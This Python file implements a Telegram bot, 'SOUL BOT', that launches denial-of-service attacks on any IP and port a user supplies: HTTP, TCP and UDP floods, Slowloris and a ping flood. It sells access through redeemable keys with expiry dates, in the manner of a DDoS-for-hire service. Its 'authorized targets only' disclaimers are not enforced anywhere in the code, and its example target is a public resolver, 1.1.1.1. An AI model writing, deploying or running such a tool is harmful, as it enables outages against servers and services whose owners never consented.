"""
SOUL BOT - Built-in HTTP Stress Testing (No External API)
Can test your own servers or authorized targets only
"""

import asyncio
import logging
import os
import json
import string
import random
import sys
import socket
import ssl
import threading
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# --- Configuration ---
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
OWNER_ID = int(os.environ.get("OWNER_ID", "0"))

# Data files
DATA_JSON = "users_data.json"

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# Global variables
user_state = {}
data = {
    "approved_users": {},
    "admins": {},
    "keys": {},
    "disapproved_users": []
}
active_attacks = {}  # Track active attacks

# --- Data Management Functions ---
def load_data():
    global data
    try:
        if os.path.exists(DATA_JSON):
            with open(DATA_JSON, 'r') as f:
                data = json.load(f)
            logger.info(f"Data loaded: {len(data.get('approved_users', {}))} users")
    except Exception as e:
        logger.error(f"Error loading data: {e}")

def save_data():
    try:
        with open(DATA_JSON, 'w') as f:
            json.dump(data, f, indent=4)
        logger.info("Data saved")
    except Exception as e:
        logger.error(f"Error saving data: {e}")

def generate_random_key():
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(20))

def is_owner(user_id):
    return user_id == OWNER_ID

def is_admin(user_id):
    if user_id == OWNER_ID:
        return True
    if str(user_id) in data.get("admins", {}):
        expiry_str = data["admins"][str(user_id)].get("expiry")
        try:
            expiry = datetime.strptime(expiry_str, "%Y-%m-%d")
            if datetime.now() < expiry:
                return True
            else:
                del data["admins"][str(user_id)]
                save_data()
        except:
            pass
    return False

def is_approved(user_id):
    if is_admin(user_id):
        return True
    if str(user_id) in data.get("approved_users", {}):
        expiry_str = data["approved_users"][str(user_id)].get("expiry")
        try:
            expiry = datetime.strptime(expiry_str, "%Y-%m-%d")
            if datetime.now() < expiry:
                return True
            else:
                del data["approved_users"][str(user_id)]
                save_data()
        except:
            pass
    return False

# --- Built-in Attack Methods (No External API) ---

async def http_flood(target_ip, port, duration):
    """HTTP Flood attack using aiohttp"""
    import aiohttp
    
    url = f"http://{target_ip}:{port}"
    end_time = datetime.now() + timedelta(seconds=duration)
    requests_sent = 0
    errors = 0
    
    async def send_request(session):
        nonlocal requests_sent, errors
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as response:
                requests_sent += 1
                await response.read()
        except:
            errors += 1
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        while datetime.now() < end_time:
            # Create 50 concurrent connections
            for _ in range(50):
                task = asyncio.create_task(send_request(session))
                tasks.append(task)
            await asyncio.sleep(0.1)
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    return requests_sent, errors

async def tcp_flood(target_ip, port, duration):
    """TCP Flood attack using sockets"""
    end_time = datetime.now() + timedelta(seconds=duration)
    connections = 0
    errors = 0
    
    def create_connection():
        nonlocal connections, errors
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            connections += 1
            sock.close()
        except:
            errors += 1
    
    while datetime.now() < end_time:
        # Create multiple threads for concurrency
        threads = []
        for _ in range(100):
            t = threading.Thread(target=create_connection)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=1)
        
        await asyncio.sleep(0.05)
    
    return connections, errors

async def udp_flood(target_ip, port, duration):
    """UDP Flood attack"""
    end_time = datetime.now() + timedelta(seconds=duration)
    packets_sent = 0
    errors = 0
    
    def send_udp():
        nonlocal packets_sent, errors
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(1024)  # Random data packet
            sock.sendto(data, (target_ip, port))
            packets_sent += 1
            sock.close()
        except:
            errors += 1
    
    while datetime.now() < end_time:
        threads = []
        for _ in range(200):
            t = threading.Thread(target=send_udp)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=0.5)
        
        await asyncio.sleep(0.05)
    
    return packets_sent, errors

async def slowloris(target_ip, port, duration):
    """Slowloris attack (slow HTTP headers)"""
    end_time = datetime.now() + timedelta(seconds=duration)
    connections = []
    
    def create_slow_connection():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, port))
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(b"Host: " + target_ip.encode() + b"\r\n")
            sock.send(b"User-Agent: Mozilla/5.0\r\n")
            sock.send(b"Accept-language: en-US,en\r\n")
            # Keep connection open by sending headers slowly
            connections.append(sock)
            return sock
        except:
            return None
    
    def keep_alive():
        for sock in connections[:]:
            try:
                sock.send(b"X-Header: " + os.urandom(10).hex().encode() + b"\r\n")
            except:
                try:
                    connections.remove(sock)
                    sock.close()
                except:
                    pass
    
    # Create initial connections
    for _ in range(500):
        sock = create_slow_connection()
        await asyncio.sleep(0.1)
    
    # Keep connections alive
    start_time = datetime.now()
    while datetime.now() < end_time:
        keep_alive()
        await asyncio.sleep(10)
    
    # Cleanup
    for sock in connections:
        try:
            sock.close()
        except:
            pass
    
    return len(connections)

async def ping_flood(target_ip, duration):
    """ICMP Ping Flood (requires root/admin privileges)"""
    end_time = datetime.now() + timedelta(seconds=duration)
    sent = 0
    
    while datetime.now() < end_time:
        try:
            # Using system ping command
            process = await asyncio.create_subprocess_exec(
                'ping', '-c', '1', '-W', '1', target_ip,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            await process.wait()
            sent += 1
            await asyncio.sleep(0.01)
        except:
            pass
    
    return sent

# --- Attack Dispatcher ---
async def run_attack(attack_type, target_ip, port, duration):
    """Run the selected attack type"""
    attack_functions = {
        "http": http_flood,
        "tcp": tcp_flood,
        "udp": udp_flood,
        "slowloris": slowloris,
    }
    
    if attack_type == "ping":
        return await ping_flood(target_ip, duration)
    elif attack_type in attack_functions:
        return await attack_functions[attack_type](target_ip, port, duration)
    else:
        return None

# --- Keyboard Builders ---
def get_owner_keyboard():
    keyboard = [
        [InlineKeyboardButton("📊 Check Status", callback_data="check")],
        [InlineKeyboardButton("✅ Approve User", callback_data="approve"),
         InlineKeyboardButton("❌ Disapprove User", callback_data="disapprove")],
        [InlineKeyboardButton("👮 Add Admin", callback_data="add_admin"),
         InlineKeyboardButton("🚫 Remove Admin", callback_data="remove_admin")],
        [InlineKeyboardButton("🎟️ Generate Key", callback_data="gen_key"),
         InlineKeyboardButton("🚀 Run Attack", callback_data="run")],
        [InlineKeyboardButton("📊 View Stats", callback_data="stats"),
         InlineKeyboardButton("⚡ Attack Methods", callback_data="methods")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_admin_keyboard():
    keyboard = [
        [InlineKeyboardButton("✅ Approve User", callback_data="approve"),
         InlineKeyboardButton("❌ Disapprove User", callback_data="disapprove")],
        [InlineKeyboardButton("👮 Add Admin", callback_data="add_admin"),
         InlineKeyboardButton("🚫 Remove Admin", callback_data="remove_admin")],
        [InlineKeyboardButton("🎟️ Generate Key", callback_data="gen_key"),
         InlineKeyboardButton("🚀 Run Attack", callback_data="run")],
        [InlineKeyboardButton("📊 View Stats", callback_data="stats")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_approved_keyboard():
    keyboard = [
        [InlineKeyboardButton("🚀 Run Attack", callback_data="run")],
        [InlineKeyboardButton("📊 My Status", callback_data="my_status")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_user_keyboard():
    keyboard = [
        [InlineKeyboardButton("🎟️ Redeem Key", callback_data="redeem_key")]
    ]
    return InlineKeyboardMarkup(keyboard)

# --- Command Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or "User"

    welcome_msg = f"👋 **Welcome {user_name}!**\n\n"
    welcome_msg += "⚡ **Built-in Stress Testing Bot**\n"
    welcome_msg += "No external API required - runs on your server!\n\n"
    welcome_msg += "⚠️ **Important:** Only use on servers you own or have permission to test.\n\n"

    if is_owner(user_id):
        welcome_msg += "🔑 **You are the Owner**\n"
        keyboard = get_owner_keyboard()
    elif is_admin(user_id):
        welcome_msg += "👮 **You are an Admin**\n"
        keyboard = get_admin_keyboard()
    elif is_approved(user_id):
        welcome_msg += "✅ **You are Approved**\n"
        keyboard = get_approved_keyboard()
    else:
        welcome_msg += "📌 **Welcome to the Bot**\nRedeem a key to get access.\n\n"
        keyboard = get_user_keyboard()

    await update.message.reply_text(welcome_msg, parse_mode='Markdown', reply_markup=keyboard)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = query.from_user.id
    callback_data = query.data

    if callback_data == "methods":
        if not is_approved(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        methods_msg = (
            "⚡ **Available Attack Methods**\n\n"
            "1. **HTTP Flood** - Sends HTTP requests\n"
            "   Format: `http IP PORT TIME`\n\n"
            "2. **TCP Flood** - TCP connection flood\n"
            "   Format: `tcp IP PORT TIME`\n\n"
            "3. **UDP Flood** - UDP packet flood\n"
            "   Format: `udp IP PORT TIME`\n\n"
            "4. **Slowloris** - Slow HTTP attack\n"
            "   Format: `slowloris IP PORT TIME`\n\n"
            "5. **Ping Flood** - ICMP ping flood\n"
            "   Format: `ping IP TIME`\n\n"
            "**Example:**\n"
            "`http 1.1.1.1 80 30`"
        )
        await query.message.reply_text(methods_msg, parse_mode='Markdown')
        return

    elif callback_data == "check":
        if not is_owner(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        await check_status(query.message)
        return

    elif callback_data == "approve":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'approve', 'step': 'awaiting_id'}
        await query.message.reply_text("✅ Approve User\n\nSend: `<user_id> <days>`", parse_mode='Markdown')
        return

    elif callback_data == "disapprove":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'disapprove', 'step': 'awaiting_id'}
        await query.message.reply_text("❌ Disapprove User\n\nSend user ID:", parse_mode='Markdown')
        return

    elif callback_data == "add_admin":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'add_admin', 'step': 'awaiting_id'}
        await query.message.reply_text("👮 Add Admin\n\nSend: `<user_id> <days>`", parse_mode='Markdown')
        return

    elif callback_data == "remove_admin":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'remove_admin', 'step': 'awaiting_id'}
        await query.message.reply_text("🚫 Remove Admin\n\nSend user ID:", parse_mode='Markdown')
        return

    elif callback_data == "gen_key":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'gen_key', 'step': 'awaiting_days'}
        await query.message.reply_text("🎟️ Generate Key\n\nSend number of days:", parse_mode='Markdown')
        return

    elif callback_data == "run":
        if not is_approved(user_id):
            await query.message.reply_text("❌ Not authorized. Please redeem a key first.")
            return
        user_state[user_id] = {'action': 'run', 'step': 'awaiting_params'}
        await query.message.reply_text(
            "🚀 **Run Attack**\n\n"
            "Select attack method:\n"
            "• `http IP PORT TIME` - HTTP flood\n"
            "• `tcp IP PORT TIME` - TCP flood\n"
            "• `udp IP PORT TIME` - UDP flood\n"
            "• `slowloris IP PORT TIME` - Slowloris\n"
            "• `ping IP TIME` - Ping flood\n\n"
            "Example: `http 1.1.1.1 80 30`",
            parse_mode='Markdown'
        )
        return

    elif callback_data == "stats":
        await show_stats(query.message, user_id)
        return

    elif callback_data == "my_status":
        await show_my_status(query.message, user_id)
        return

    elif callback_data == "redeem_key":
        user_state[user_id] = {'action': 'redeem', 'step': 'awaiting_key'}
        await query.message.reply_text("🎟️ Redeem Key\n\nSend your access key:", parse_mode='Markdown')
        return

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    if user_id not in user_state:
        await update.message.reply_text("ℹ️ Use /start to see options.")
        return

    action = user_state[user_id].get('action')

    if action == 'approve':
        await process_approve(update, text)
    elif action == 'disapprove':
        await process_disapprove(update, text)
    elif action == 'add_admin':
        await process_add_admin(update, text)
    elif action == 'remove_admin':
        await process_remove_admin(update, text)
    elif action == 'gen_key':
        await process_gen_key(update, text)
    elif action == 'run':
        await process_run(update, text)
    elif action == 'redeem':
        await process_redeem(update, text)

async def process_approve(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        parts = text.strip().split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format. Use: user_id days")
            return

        target_id, days = parts[0], int(parts[1])
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")

        data["approved_users"][target_id] = {
            "expiry": expiry_date,
            "approved_by": user_id
        }

        if int(target_id) in data.get("disapproved_users", []):
            data["disapproved_users"].remove(int(target_id))

        save_data()
        await update.message.reply_text(f"✅ User Approved!\nID: {target_id}\nExpires: {expiry_date}")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_disapprove(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        target_id = int(text.strip())

        if str(target_id) in data.get("approved_users", {}):
            del data["approved_users"][str(target_id)]

        if target_id not in data.get("disapproved_users", []):
            data["disapproved_users"].append(target_id)

        save_data()
        await update.message.reply_text(f"❌ User {target_id} disapproved!")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_add_admin(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        parts = text.strip().split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format. Use: user_id days")
            return

        target_id, days = parts[0], int(parts[1])
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")

        data["admins"][target_id] = {
            "expiry": expiry_date,
            "added_by": user_id
        }

        save_data()
        await update.message.reply_text(f"👮 Admin Added!\nID: {target_id}\nExpires: {expiry_date}")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_remove_admin(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        target_id = text.strip()
        if target_id in data.get("admins", {}):
            del data["admins"][target_id]
            save_data()
            await update.message.reply_text(f"🚫 Admin {target_id} removed!")
        else:
            await update.message.reply_text(f"User {target_id} is not an admin.")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_gen_key(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        days = int(text.strip())
        key = generate_random_key()

        data["keys"][key] = {
            "days": days,
            "created_by": user_id,
            "redeemed": False,
            "redeemed_by": None
        }

        save_data()
        await update.message.reply_text(
            f"🎟️ Key Generated!\n🔑 `{key}`\n📅 Valid for: {days} days\n\n"
            f"Share this key with users to grant access.",
            parse_mode='Markdown'
        )
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_run(update: Update, text: str):
    user_id = update.effective_user.id
    
    try:
        parts = text.strip().split()
        if len(parts) < 3:
            await update.message.reply_text(
                "❌ Invalid format.\n\n"
                "Use:\n"
                "• `http IP PORT TIME`\n"
                "• `tcp IP PORT TIME`\n"
                "• `udp IP PORT TIME`\n"
                "• `slowloris IP PORT TIME`\n"
                "• `ping IP TIME`",
                parse_mode='Markdown'
            )
            return

        attack_type = parts[0].lower()
        
        if attack_type == "ping":
            if len(parts) != 3:
                await update.message.reply_text("❌ Format: `ping IP TIME`", parse_mode='Markdown')
                return
            target_ip = parts[1]
            duration = int(parts[2])
            port = None
        else:
            if len(parts) != 4:
                await update.message.reply_text(f"❌ Format: `{attack_type} IP PORT TIME`", parse_mode='Markdown')
                return
            target_ip = parts[1]
            port = int(parts[2])
            duration = int(parts[3])
        
        # Validate inputs
        if duration < 1 or duration > 300:
            await update.message.reply_text("❌ Duration must be between 1 and 300 seconds.")
            return
        
        if port and (port < 1 or port > 65535):
            await update.message.reply_text("❌ Port must be between 1 and 65535.")
            return
        
        # Confirm attack
        confirm_msg = f"⚠️ **Attack Confirmation**\n\n"
        confirm_msg += f"Method: `{attack_type.upper()}`\n"
        confirm_msg += f"Target: `{target_ip}`\n"
        if port:
            confirm_msg += f"Port: `{port}`\n"
        confirm_msg += f"Duration: `{duration}s`\n\n"
        confirm_msg += f"Type 'YES' to start the attack:"
        
        user_state[user_id] = {
            'action': 'confirm_attack',
            'attack_type': attack_type,
            'target_ip': target_ip,
            'port': port,
            'duration': duration
        }
        await update.message.reply_text(confirm_msg, parse_mode='Markdown')
        
    except ValueError:
        await update.message.reply_text("❌ Invalid numbers. Make sure TIME is a number.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_redeem(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        key = text.strip()

        if key not in data.get("keys", {}):
            await update.message.reply_text("❌ Invalid key.")
            user_state.pop(user_id, None)
            return

        key_data = data["keys"][key]

        if key_data.get("redeemed"):
            await update.message.reply_text("❌ Key already redeemed.")
            user_state.pop(user_id, None)
            return

        days = key_data.get("days", 0)
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")

        data["approved_users"][str(user_id)] = {
            "expiry": expiry_date,
            "approved_by": "key_redemption"
        }

        data["keys"][key]["redeemed"] = True
        data["keys"][key]["redeemed_by"] = user_id

        save_data()
        await update.message.reply_text(
            f"🎉 **Key Redeemed Successfully!**\n\n"
            f"✅ You now have access!\n"
            f"📅 Valid for: {days} days\n"
            f"⏰ Expires: {expiry_date}\n\n"
            f"🚀 Use /start to see your options.",
            parse_mode='Markdown'
        )
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# Handle attack confirmation
async def handle_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.upper()
    
    if user_id not in user_state:
        return
    
    state = user_state[user_id]
    if state.get('action') != 'confirm_attack':
        return
    
    if text == "YES":
        attack_type = state['attack_type']
        target_ip = state['target_ip']
        port = state['port']
        duration = state['duration']
        
        await update.message.reply_text(f"⚡ Starting {attack_type.upper()} attack on {target_ip} for {duration}s...")
        
        try:
            # Run attack
            if attack_type == "ping":
                result = await run_attack("ping", target_ip, None, duration)
                await update.message.reply_text(
                    f"✅ **Attack Completed!**\n\n"
                    f"Method: {attack_type.upper()}\n"
                    f"Target: {target_ip}\n"
                    f"Duration: {duration}s\n"
                    f"Packets Sent: {result}"
                )
            else:
                result = await run_attack(attack_type, target_ip, port, duration)
                if isinstance(result, tuple) and len(result) == 2:
                    sent, errors = result
                    await update.message.reply_text(
                        f"✅ **Attack Completed!**\n\n"
                        f"Method: {attack_type.upper()}\n"
                        f"Target: {target_ip}:{port}\n"
                        f"Duration: {duration}s\n"
                        f"Requests Sent: {sent}\n"
                        f"Errors: {errors}"
                    )
                else:
                    await update.message.reply_text(
                        f"✅ **Attack Completed!**\n\n"
                        f"Method: {attack_type.upper()}\n"
                        f"Target: {target_ip}:{port}\n"
                        f"Duration: {duration}s\n"
                        f"Connections: {result}"
                    )
        except Exception as e:
            await update.message.reply_text(f"❌ Attack failed: {e}")
        
        user_state.pop(user_id, None)
    else:
        await update.message.reply_text("❌ Attack cancelled.")
        user_state.pop(user_id, None)

async def check_status(message):
    status_msg = (
        f"✅ **Bot Status**\n\n"
        f"⚡ Built-in attack methods available:\n"
        f"• HTTP Flood - Layer 7 attacks\n"
        f"• TCP Flood - Layer 4 attacks\n"
        f"• UDP Flood - Layer 4 attacks\n"
        f"• Slowloris - Slow HTTP attack\n"
        f"• Ping Flood - ICMP flood\n\n"
        f"📊 Active attacks: {len(active_attacks)}\n"
        f"👥 Total users: {len(data.get('approved_users', {}))}\n\n"
        f"⚠️ **Important:** Only use on servers you own or have permission to test!"
    )
    await message.reply_text(status_msg, parse_mode='Markdown')

async def show_stats(message, user_id):
    approved_count = len(data.get("approved_users", {}))
    admin_count = len(data.get("admins", {}))
    key_count = len(data.get("keys", {}))
    redeemed_count = sum(1 for k in data.get("keys", {}).values() if k.get("redeemed"))
    disapproved_count = len(data.get("disapproved_users", []))

    stats_msg = (
        f"📊 **System Statistics**\n\n"
        f"✅ Approved Users: {approved_count}\n"
        f"👮 Admins: {admin_count}\n"
        f"🎟️ Total Keys: {key_count}\n"
        f"✔ Redeemed Keys: {redeemed_count}\n"
        f"❌ Disapproved Users: {disapproved_count}\n\n"
        f"🔄 Last Updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )

    await message.reply_text(stats_msg, parse_mode='Markdown')

async def show_my_status(message, user_id):
    if str(user_id) in data.get("approved_users", {}):
        expiry = data["approved_users"][str(user_id)].get("expiry")
        time_left = (datetime.strptime(expiry, "%Y-%m-%d") - datetime.now()).days
        status_msg = (
            f"👤 **Your Status**\n\n"
            f"✅ Status: Approved\n"
            f"⏰ Expires: {expiry}\n"
            f"📅 {time_left} days remaining"
        )
    elif str(user_id) in data.get("admins", {}):
        expiry = data["admins"][str(user_id)].get("expiry")
        time_left = (datetime.strptime(expiry, "%Y-%m-%d") - datetime.now()).days
        status_msg = (
            f"👤 **Your Status**\n\n"
            f"👮 Status: Admin\n"
            f"⏰ Expires: {expiry}\n"
            f"📅 {time_left} days remaining"
        )
    elif is_owner(user_id):
        status_msg = (
            f"👤 **Your Status**\n\n"
            f"🔑 Status: Owner\n"
            f"♾️ Access: Unlimited"
        )
    else:
        status_msg = (
            f"👤 **Your Status**\n\n"
            f"❌ Status: No Access\n"
            f"💡 Redeem a key to get access!"
        )

    await message.reply_text(status_msg, parse_mode='Markdown')

# --- Main Function ---
async def run_bot():
    load_data()
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex('^(YES|yes|Yes)$'), handle_confirmation))
    
    logger.info("=== SOUL BOT STARTED ===")
    logger.info(f"Owner ID: {OWNER_ID}")
    logger.info("Built-in attack methods available (no external API)")
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    logger.info("Bot is polling for updates...")
    
    try:
        while True:
            await asyncio.sleep(60)
            save_data()
            logger.info("Heartbeat: Bot is running")
    except asyncio.CancelledError:
        logger.info("Bot stopped")
    finally:
        await app.stop()
        await app.shutdown()

def main():
    try:
        asyncio.run(run_bot())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()